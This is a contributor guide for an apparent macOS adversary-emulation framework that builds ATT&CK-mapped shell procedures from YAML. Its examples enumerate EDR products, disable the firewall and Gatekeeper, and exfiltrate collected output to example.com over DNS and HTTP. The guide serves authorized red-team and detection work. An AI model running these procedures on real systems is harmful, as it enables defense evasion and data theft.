# How to Add a New Procedure in YAML

**Quick path:** [Create a New TTP Fast.md](Create%20a%20New%20TTP%20Fast.md) (copy template, fill metadata, build, `--lint-local`).

YAML procedures compile to shell on top of `base.sh`, inheriting logging, encoding, encryption, and optional exfiltration (DNS/HTTP) from the base runtime.

**End-to-end checklist:** edit YAML → `python3 cicd/build/build_shell_procedure.py --validate` → `python3 cicd/build/build_shell_procedure.py <file>` (build runs **`sh -n`** automatically) → optional `./attackmacos/attackmacos.sh --lint-local ...` to re-check without rebuilding → optional `bash attackmacos/ttp/<tactic>/shell/<procedure_name>.sh --help`. Sourcing and MITRE alignment: [R&D References.md](../../R&D%20References.md). Parent index: [Guides README.md](../README.md).

## YAML Structure Order

Fill out your YAML file in this order:

1. **Procedure Metadata** - Basic information about your technique
2. **Arguments** - Command-line options users can specify  
3. **Global Variables** - Data that your functions will reference
4. **Functions** - Shell code that implements the technique

---

## 1. Procedure Metadata

These fields identify your technique and provide basic information.

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| **procedure_name** | string | ✅ | Stable snake_case name for the generated script | `security_software`, `defaults_domains` |
| **ttp_id** | string | ✅ | MITRE ATT&CK technique ID (T + 4 digits, optional sub-technique) | `T1518`, `T1518.001` |
| **tactic** | enum | ✅ | MITRE ATT&CK tactic | `Discovery` |
| **guid** | string | ✅ | UUID4 format | `456e7890-e12b-34c5-d678-901234567890` |
| **intent** | string | ✅ | Brief description (10-500 chars) | `Discover security software installed on macOS` |
| **author** | string | ✅ | Author with contact info | `@darmado \| https://x.com/darmad0` |
| **version** | string | ✅ | Semantic version | `2.0.0` |
| **created** | string | ✅ | Date in YYYY-MM-DD format | `2025-05-27` |

<details>
<summary>Procedure Metadata Example</summary>

```yaml
---
procedure_name: security_software
tactic: Discovery
guid: 3349e821-b561-4407-a4f7-45ff1fb2900b
intent: Discover EDR and security software installed on macOS systems
author: "@darmado | https://x.com/darmad0"
version: "1.0.0"
created: "2025-05-28"
platform:
  - darwin
```
</details>

---

## 2. Arguments Section

The `arguments` section defines command-line options that users can specify when running your script. Each argument calls one or more functions when used.

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| **option** | string | ✅ | Must use `--long` format only | `--edr-processes` |
| **description** | string | ✅ | Help text (5-100 chars) - use adversary language | `Discover EDR processes using ps` |
| **type** | string | ❌ | Only for value args: `string` or `integer` | `string` |
| **input_required** | boolean | ❌ | Whether this argument requires user.arg (default: false) | `true` |
| **execute_function** | array | ⚠️ | Functions when the option runs; use `[]` only for input-only flags that never execute technique functions (rare). Prefer every actionable flag call at least one function. | `[discover_edr_processes]` |

### Arguments with User Input

When `input_required: true` is set, the argument accepts user.arg that gets stored in a corresponding global variable. This is essential for arguments that need user-provided values like enable/disable states, file paths, or configuration options.

**Input Variable Naming Convention:**
- Argument: `--gatekeeper` → Input Variable: `INPUT_GATEKEEPER`
- Argument: `--appfw-defaults` → Input Variable: `INPUT_APPFW_DEFAULTS` 
- Argument: `--setblockall` → Input Variable: `INPUT_SETBLOCKALL`

**Important**: You must define the corresponding `INPUT_*` variable in the `global_variable` section for each argument with `input_required: true`.

### Input Validation Best Practices

When creating functions that handle user.arg, implement validation to accept multiple input formats and provide clear error messages:

**Standard Input Patterns:**
- **Boolean-style**: `enable/disable`, `on/off`, `yes/no`, `true/false`, `1/0`
- **System-specific**: `ON/OFF` (for macOS socketfilterfw commands)
- **Custom values**: Application paths, domain names, etc.

**Validation Template:**
```bash
function_name() {
    case "$INPUT_VARIABLE_NAME" in
        enable|on|yes|true|1)
            # Enable action
            ;;
        disable|off|no|false|0)
            # Disable action
            ;;
        ON|OFF)
            # Pass through system-specific values
            ;;
        *)
            $CMD_PRINTF "ERROR|Invalid input: %s. Use enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_VARIABLE_NAME"
            return 1
            ;;
    esac
}
```

### socketfilterfw Input Conversion

macOS `socketfilterfw` commands require uppercase "ON"/"OFF" values. Convert user.arg to the required format:

```bash
appfw_function() {
    local socketfilter_input=""
    case "$INPUT_APPFW" in
        enable|on|yes|true|1)
            socketfilter_input="ON"
            ;;
        disable|off|no|false|0)
            socketfilter_input="OFF"
            ;;
        ON|OFF)
            socketfilter_input="$INPUT_APPFW"
            ;;
        *)
            $CMD_PRINTF "APPFW_ERROR|Invalid input: %s. Use ON/OFF, enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_APPFW"
            return 1
            ;;
    esac
    local output=$("$CMD_SOCKETFILTERFW" --setglobalstate "$socketfilter_input" 2>&1)
    $CMD_PRINTF "APPFW_RESULT|%s\n" "$output"
}
```

<details>
<summary>Arguments Section Example</summary>

```yaml
procedure:
  arguments:
    - option: "--edr-processes"
      description: "Discover EDR processes using ps"
      execute_function:
        - discover_edr_processes

    - option: "--edr-files"
      description: "Discover EDR files in system paths"
      execute_function:
        - discover_edr_files

    - option: "--edr-all"
      description: "Run all EDR discovery functions"
      execute_function:
        - discover_edr_processes
        - discover_edr_files
```
</details>

<details>
<summary>Arguments with Input Requirements Example</summary>

```yaml
procedure:
  arguments:
    # Boolean flag arguments (no input required)
    - option: "--show-security-settings"
      description: "Display firewall settings and configuration"
      execute_function:
        - show_security_settings

    # Input required arguments (user provides values)
    - option: "--gatekeeper"
      description: "Enable or disable Gatekeeper auto-rearm functionality"
      input_required: true
      type: string
      execute_function:
        - gatekeeper_defaults

    - option: "--appfw"
      description: "Enable or disable application firewall globally"
      input_required: true
      type: string
      execute_function:
        - appfw_socketfilter

    - option: "--setblockall"
      description: "Block all incoming connections through the firewall"
      input_required: true
      type: string
      execute_function:
        - setblockall_fw

    - option: "--blockapp"
      description: "Block specific application from network access"
      input_required: true
      type: string
      execute_function:
        - blockapp_fw

  global_variable:
    # Input variables for arguments with input_required: true
    - name: INPUT_GATEKEEPER
      type: string
      default_value: ''
    - name: INPUT_APPFW
      type: string
      default_value: ''
    - name: INPUT_SETBLOCKALL
      type: string
      default_value: ''
    - name: INPUT_BLOCKAPP
      type: string
      default_value: ''

  functions:
    - name: gatekeeper_defaults
      language: ["shell"]
      opsec:
        check_fda:
          enabled: false
      code: |
        gatekeeper_defaults() {
            case "$INPUT_GATEKEEPER" in
                enable|on|yes|true|1)
                    local output=$("$CMD_DEFAULTS" write "/Library/Preferences/com.apple.security" "GKAutoRearm" -bool YES 2>&1)
                    $CMD_PRINTF "GATEKEEPER_ENABLE|%s\n" "$output"
                    ;;
                disable|off|no|false|0)
                    local output=$("$CMD_DEFAULTS" write "/Library/Preferences/com.apple.security" "GKAutoRearm" -bool NO 2>&1)
                    $CMD_PRINTF "GATEKEEPER_DISABLE|%s\n" "$output"
                    ;;
                *)
                    $CMD_PRINTF "GATEKEEPER_ERROR|Invalid input: %s. Use enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_GATEKEEPER"
                    return 1
                    ;;
            esac
        }

    - name: appfw_socketfilter
      language: ["shell"]
      opsec:
        check_fda:
          enabled: false
      code: |
        appfw_socketfilter() {
            # Convert input to uppercase ON/OFF format required by socketfilterfw
            case "$INPUT_APPFW" in
                enable|on|yes|true|1)
                    local output=$("$CMD_SOCKETFILTERFW" --setglobalstate ON 2>&1)
                    $CMD_PRINTF "APPFW_ENABLE|%s\n" "$output"
                    ;;
                disable|off|no|false|0)
                    local output=$("$CMD_SOCKETFILTERFW" --setglobalstate OFF 2>&1)
                    $CMD_PRINTF "APPFW_DISABLE|%s\n" "$output"
                    ;;
                *)
                    $CMD_PRINTF "APPFW_ERROR|Invalid input: %s. Use enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_APPFW"
                    return 1
                    ;;
            esac
        }

# Usage Examples:
# ./script.sh --gatekeeper enable
# ./script.sh --appfw disable
# ./script.sh --setblockall on
# ./script.sh --blockapp "/Applications/Suspicious App.app"
```
</details>

---

## 3. Global Variables Section

The `global_variable` section defines data that your functions will reference. Use these global variables to store process names, file paths, and other data that your shell functions need.

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| **name** | string | ✅ | UPPER_CASE format, use naming patterns below | `EDR_PROCESS_NAMES` |
| **type** | string | ✅ | `string` only (we support 2 types) | `string` |
| **default_value** | any | ✅ | Single value or multiple values (see syntax below) | `"falcon cbagent sentinel"` |

### Global Variable Syntax and Usage

| Data Type | YAML Syntax | Used By | What To Store |
|-----------|-------------|---------|---------------|
| **Single Value** | `"single_value"` | `$VAR_NAME` in script functions | Single path, configuration flag, single process name |
| **Multiple Values** | `("item1" "item2" "item3")` | `local items=($VAR_NAME)` in script functions | Process names list, directory paths, file patterns |

### Variable Naming Patterns

| Pattern | Example | Purpose |
|---------|---------|---------|
| `*_PROCESS_NAMES` | `EDR_PROCESS_NAMES` | List of process names for ps commands |
| `*_SEARCH_PATHS` | `SYSTEM_SEARCH_PATHS` | Directory paths for find commands |
| `*_VENDOR_*` | `EDR_VENDOR_PROCESSES` | Structured vendor data with colons |
| `*_SERVICE_PATHS` | `LAUNCH_SERVICE_PATHS` | Service-specific directories |

<details>
<summary>Global Variables Section Example</summary>

```yaml
  global_variable:
    # Multiple process names (multiple values syntax)
    - name: EDR_PROCESS_NAMES
      type: string
      default_value: ("falcon" "cbagent" "sentinel" "cylance")

    # Multiple directory paths (multiple values syntax)
    - name: SYSTEM_SEARCH_PATHS
      type: string
      default_value: ("/Applications" "/Library" "/usr/local")

    # Single process name (single value syntax)
    - name: TARGET_PROCESS_NAME
      type: string
      default_value: "CrowdStrike"
```

**How to use these in your functions:**

```bash
# Multiple values - simple list
discover_edr_processes() {
    local processes=($EDR_PROCESS_NAMES)
    for proc in "${processes[@]}"; do
        # Use $proc in ps commands
    done
}

# Multiple values - directory paths  
discover_edr_files() {
    local search_paths=($SYSTEM_SEARCH_PATHS)
    for path in "${search_paths[@]}"; do
        # Use $path in find commands
    done
}

# Single value - direct usage
check_specific_process() {
    echo "Checking for: $TARGET_PROCESS_NAME"
}
```
</details>

<details>
<summary>Global Variables Usage Examples</summary>

```bash
# Multiple values - simple list
discover_edr_processes() {
    local processes=($EDR_PROCESS_NAMES)
    for proc in "${processes[@]}"; do
        # Use $proc in ps commands
    done
}

# Multiple values - directory paths  
discover_edr_files() {
    local search_paths=($SYSTEM_SEARCH_PATHS)
    for path in "${search_paths[@]}"; do
        # Use $path in find commands
    done
}

# Single value - direct usage
check_specific_process() {
    echo "Checking for: $TARGET_PROCESS_NAME"
}
```
</details>

---

## 4. Functions Section

The `functions` section contains the script functions that implement your technique. Each function performs one specific task and outputs results using `printf`. The framework automatically captures this output and routes it through the processing pipeline, enabling users to leverage base.sh capabilities for encoding, encryption, and exfiltration.

| Field | Type | Required | Function Names | Description | Example |
|-------|------|----------|----------------|-------------|---------|
| **name** | string | ✅ | Use MITRE ATT&CK tactic prefixes (see naming table below) | Function name using adversary language | `discover_edr_processes` |
| **language** | array | ✅ | Must specify at least one language | Programming/scripting languages used in function | `["shell"]`, `["shell", "python"]` |
| **opsec** | object | ✅ | N/A | OPSEC requirements | See OPSEC table below |
| **code** | string | ✅ | N/A | Shell function implementation | See code requirements below |

### Code Requirements

Your function code must follow these requirements:

| Requirement | Description | Example |
|-------------|-------------|---------|
| **Output via printf** | Use `printf` to output your results - the framework captures this automatically | `$CMD_PRINTF "EDR_PROCESS\|%s\|%s\n" "$proc" "$result"` |
| **Global commands** | Use predefined global command variables from base.sh (optional but recommended) | `$CMD_PS`, `$CMD_GREP`, `$CMD_FIND` |
| **Global variables** | Use global variables for all data (no hard-coded values) | `local processes=($EDR_PROCESS_NAMES)` |
| **Output format** | Output pipe-delimited format: `TYPE\|PATTERN\|RESULT` | `"EDR_PROCESS\|falcon\|process details"` |
| **Function return** | End functions with `return 0` for proper exit codes | `return 0` |

**Important**: Base.sh provides predefined global variables for all native macOS commands (see [Global Variables Reference](../Index/Global%20Variables.md)). Using these global command variables allows us to update commands across hundreds of scripts simultaneously during the build process or major base.sh updates. **These predefined global variables are reserved and maintained by the framework.**

**Examples of predefined command variables:**
- `$CMD_PS` - Process listing command
- `$CMD_GREP` - Text search command  
- `$CMD_FIND` - File search command
- `$CMD_SQLITE3` - SQLite database command
- `$CMD_OPENSSL` - Encryption/crypto command

<details>
<summary>Code Requirements Example</summary>

```bash
discover_edr_processes() {
    local processes=($EDR_PROCESS_NAMES)
    
    for proc in "${processes[@]}"; do
        local proc_result=$($CMD_PS -axrww | $CMD_GREP -v grep | $CMD_GREP -i "$proc" 2>/dev/null)
        if [ -n "$proc_result" ]; then
            $CMD_PRINTF "EDR_PROCESS|%s|%s\n" "$proc" "$proc_result"
        fi
    done
    return 0
}
```
</details>

### MITRE ATT&CK Function Naming

| Tactic | Function Prefix | Example Function |
|--------|----------------|------------------|
| **Discovery** | `discover_` | `discover_edr_processes` |
| **Credential Access** | `credential_access_` | `credential_access_keychain` |
| **Collection** | `collect_` | `collect_browser_data` |
| **Persistence** | `persist_` | `persist_launch_agent` |
| **Execution** | `execute_` | `execute_payload` |
| **Defense Evasion** | `evade_` | `evade_detection` |

<details>
<summary>MITRE ATT&CK Function Naming Example</summary>

```yaml
# Good function names following MITRE ATT&CK conventions
functions:
  - name: discover_edr_processes      # Discovery tactic
  - name: credential_access_keychain  # Credential Access tactic
  - name: collect_browser_history     # Collection tactic
  - name: persist_launch_daemon       # Persistence tactic
```
</details>

### OPSEC Requirements

The `opsec` section defines security checks that should be performed before your function executes. Use these to prevent script failure or detection when accessing restricted resources.

| Field | Type | Required | Description | Use Case |
|-------|------|----------|-------------|----------|
| **check_fda.enabled** | boolean | ✅ | Check if Full Disk Access is granted before execution | Set to `true` when accessing protected directories like `/Library`, `/private`, user home directories |
| **check_permission** | object | ❌ | Check file/directory permissions before execution | Use when your function needs specific access to files/directories |

### Full Disk Access (FDA) Check

Full Disk Access is required when your script needs to access macOS protected locations. Enable this check to avoid script failure.

**When to use FDA check:**
- Accessing `/Library/Application Support/`
- Reading user home directories outside current user
- Accessing `/private/var/` directories
- Reading system configuration files

**What happens on failure:** Script exits gracefully with error message instead of crashing.

### Permission Checks

Use permission checks when your function needs specific file system access. You can check multiple files and specify different permission requirements.

| Field | Type | Required | Description | Example |
|-------|------|----------|-------------|---------|
| **path** | string | ✅ | File or directory path to check | `/Applications` |
| **required** | string | ✅ | Permission type: `read`, `write`, `execute`, or combinations | `read,write` |
| **exit_on_failure** | boolean | ❌ | Exit script if permission check fails (default: true) | `false` |

**Permission Syntax:**
- Single permission: `"read"`, `"write"`, `"execute"`
- Multiple permissions: `"read,write"`, `"read,execute"`, `"read,write,execute"`

**Multiple Permission Checks:**
You can define multiple permission checks by adding multiple objects to the `check_permission` array.

<details>
<summary>Full Disk Access (FDA) Examples</summary>

```yaml
functions:
  # Function that doesn't need FDA (safe directories only)
  - name: discover_edr_processes
    opsec:
      check_fda:
        enabled: false

  # Function that requires FDA (accessing protected directories)
  - name: credential_access_keychain
    opsec:
      check_fda:
        enabled: true  # Keychain access requires FDA

  # Function that accesses user directories
  - name: collect_user_data
    opsec:
      check_fda:
        enabled: true  # User home directory access requires FDA
```
</details>

<details>
<summary>Permission Checks Examples</summary>

```yaml
functions:
  # Single permission check
  - name: discover_edr_files
    opsec:
      check_fda:
        enabled: false
      check_permission:
        - path: "/Applications"
          required: "read"
          exit_on_failure: true

  # Multiple permission checks with different requirements
  - name: collect_system_info
    opsec:
      check_fda:
        enabled: false
      check_permission:
        - path: "/Applications"
          required: "read"
          exit_on_failure: true
        - path: "/Library/LaunchDaemons"
          required: "read,execute"
          exit_on_failure: false
        - path: "/tmp/output"
          required: "write"
          exit_on_failure: true

  # Permission check that continues on failure
  - name: discover_optional_paths
    opsec:
      check_fda:
        enabled: false
      check_permission:
        - path: "/usr/local/etc"
          required: "read"
          exit_on_failure: false  # Continue even if no access
```
</details>

<details>
<summary>OPSEC Requirements Complete Example</summary>

```yaml
functions:
  - name: discover_edr_processes
    opsec:
      check_fda:
        enabled: false
      check_permission:
        - path: "/Applications"
          required: "read"
          exit_on_failure: true
      code: |
        discover_edr_processes() {
            local processes=($EDR_PROCESS_NAMES)
            
            for proc in "${processes[@]}"; do
                local proc_result=$($CMD_PS -axrww | $CMD_GREP -v grep | $CMD_GREP -i "$proc" 2>/dev/null)
                if [ -n "$proc_result" ]; then
                    $CMD_PRINTF "EDR_PROCESS|%s|%s\n" "$proc" "$proc_result"
                fi
            done
            return 0
        }

    - name: discover_edr_files
      opsec:
        check_fda:
          enabled: false
        check_permission:
          - path: "/Library"
            required: "read,execute"
            exit_on_failure: true
      code: |
        discover_edr_files() {
            local processes=($EDR_PROCESS_NAMES)
            local search_paths=($SYSTEM_SEARCH_PATHS)
            
            for pattern in "${processes[@]}"; do
                for path in "${search_paths[@]}"; do
                    if [ -d "$path" ]; then
                        local file_result=$($CMD_FIND "$path" -iname "*$pattern*" -type f 2>/dev/null | $CMD_HEAD -5)
                        if [ -n "$file_result" ]; then
                            $CMD_PRINTF "EDR_FILE|%s|%s\n" "$pattern" "$file_result"
                        fi
                    fi
                done
            done
            return 0
        }
```
</details>

### Language Requirements

The `language` field specifies which programming/scripting languages are used in your function. This information is captured in logs to help detection engineers understand the execution profile.

| Supported Languages | Description | Use Case |
|-------------------|-------------|----------|
| **shell** | Pure shell/bash commands | Most common - native macOS commands |
| **python** | Python scripts or one-liners | Complex data processing, JSON handling |
| **javascript** | JavaScript via JXA or node | macOS automation, application control |
| **jxa** | JavaScript for Automation | macOS-specific application scripting |
| **powershell** | PowerShell (via pwsh) | Cross-platform PowerShell commands |
| **go** | Go binaries or scripts | High-performance utilities |

<details>
<summary>Language Field Examples</summary>

```yaml
# Single language (most common)
language: ["shell"]

# Multiple languages in one function
language: ["shell", "python"]

# JXA for macOS automation
language: ["jxa"]
```
</details>

**Important**: Detection engineers use this field to understand what languages/interpreters were executed, making it easier to create accurate detection rules and understand attack patterns.

---

## Complete Example

<details>
<summary>Complete YAML File Example</summary>

```yaml
---
procedure_name: edr_discovery_example
ttp_id: T1518
tactic: Discovery
guid: 00000000-0000-4000-8000-000000000001
intent: Discover EDR software installed on macOS systems
author: "@darmado | https://x.com/darmad0"
version: "1.0.0"
created: "2025-05-28"
platform:
  - darwin

procedure:
  arguments:
    - option: "--edr-processes"
      description: "Discover EDR processes using ps"
      execute_function:
        - discover_edr_processes

    - option: "--edr-files"
      description: "Discover EDR files in system paths"
      execute_function:
        - discover_edr_files

  global_variable:
    - name: EDR_PROCESS_NAMES
      type: string
      default_value: ("falcon" "cbagent" "sentinel" "cylance")

    - name: SYSTEM_SEARCH_PATHS
      type: string
      default_value: ("/Applications" "/Library" "/usr/local")

  functions:
    - name: discover_edr_processes
      language: ["shell"]
      opsec:
        check_fda:
          enabled: false
        check_permission:
          - path: "/Applications"
            required: "read"
            exit_on_failure: true
      code: |
        discover_edr_processes() {
            local processes=($EDR_PROCESS_NAMES)
            
            for proc in "${processes[@]}"; do
                local proc_result=$($CMD_PS -axrww | $CMD_GREP -v grep | $CMD_GREP -i "$proc" 2>/dev/null)
                if [ -n "$proc_result" ]; then
                    $CMD_PRINTF "EDR_PROCESS|%s|%s\n" "$proc" "$proc_result"
                fi
            done
            return 0
        }

    - name: discover_edr_files
      language: ["shell"]
      opsec:
        check_fda:
          enabled: false
        check_permission:
          - path: "/Library"
            required: "read,execute"
            exit_on_failure: true
      code: |
        discover_edr_files() {
            local processes=($EDR_PROCESS_NAMES)
            local search_paths=($SYSTEM_SEARCH_PATHS)
            
            for pattern in "${processes[@]}"; do
                for path in "${search_paths[@]}"; do
                    if [ -d "$path" ]; then
                        local file_result=$($CMD_FIND "$path" -iname "*$pattern*" -type f 2>/dev/null | $CMD_HEAD -5)
                        if [ -n "$file_result" ]; then
                            $CMD_PRINTF "EDR_FILE|%s|%s\n" "$pattern" "$file_result"
                        fi
                    fi
                done
            done
            return 0
        }
```
</details>

## Build and Test Process

### Local build (required before merge)

There is **no** repo-hosted GitHub Actions workflow that builds procedures for you today; validation is **local** (or your own CI).

From the repository root, using the project venv:

```bash
python3 -m venv cicd/venv
cicd/venv/bin/pip install pyyaml jsonschema
cicd/venv/bin/python3 cicd/build/build_shell_procedure.py --validate attackmacos/core/config/<procedure_name>.yml
cicd/venv/bin/python3 cicd/build/build_shell_procedure.py attackmacos/core/config/<procedure_name>.yml
```

Regenerate and overwrite an existing generated script:

```bash
cicd/venv/bin/python3 cicd/build/build_shell_procedure.py --force attackmacos/core/config/<procedure_name>.yml
```

**Syntax:** Successful build already runs **`sh -n`** on the output script (equivalent to `--lint-local`). Optional re-check:

```bash
./attackmacos/attackmacos.sh --lint-local --tactic <tactic_slug> --ttp <procedure_name>
```

Use the tactic **slug** from `./attackmacos/attackmacos.sh --help` (for example `discovery`).

### Git workflow (optional)

Use your normal fork/branch/PR process. Add and commit **both** `attackmacos/core/config/<procedure_name>.yml` and the generated `attackmacos/ttp/<tactic>/shell/<procedure_name>.sh` unless your team policy excludes generated files.

<details>
<summary>Example git commands</summary>

```bash
git checkout -b feature/add-my-procedure
git add attackmacos/core/config/my_procedure.yml attackmacos/ttp/discovery/shell/my_procedure.sh
git commit -m "Add my_procedure TTP"
git push -u origin feature/add-my-procedure
```
</details>

### Runtime testing (operator discretion)

After `--lint-local` passes, you may run the generated script in a lab with explicit consent. Example:

```bash
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --help
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --all
```

Use `--format json`, encoding, encryption, and exfil flags only in environments where that behavior is authorized.

## Built-in Output Handling

Your completed script includes built-in functions for advanced output handling. The framework automatically captures your function output and routes it through these capabilities:

- **Output formatting**: `--format json`, `--format csv` for structured data
- **Encoding**: `--encode base64`, `--encode hex` for data obfuscation
- **Encryption**: `--encrypt aes`, `--encrypt gpg` for data protection  
- **Exfiltration**: `--exfil-dns domain.com`, `--exfil-http url` for data extraction
- **Logging**: `--log` for automatic file logging with rotation

Simply use `printf` in your functions to output data - the framework handles the rest, enabling sophisticated adversary techniques without additional coding.

<details>
<summary>Script Usage Examples</summary>

**Basic discovery (replace `<procedure_name>` and path with your tactic folder):**
```bash
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --help

bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --format json
```

**Advanced output handling (authorized lab only):**
```bash
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --encode base64
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --encrypt aes
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --exfil-dns example.com
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --format json --exfil-http https://example.com/collect
```

**Logging and verbose output:**
```bash
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --log
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --verbose
bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --debug
```
</details>
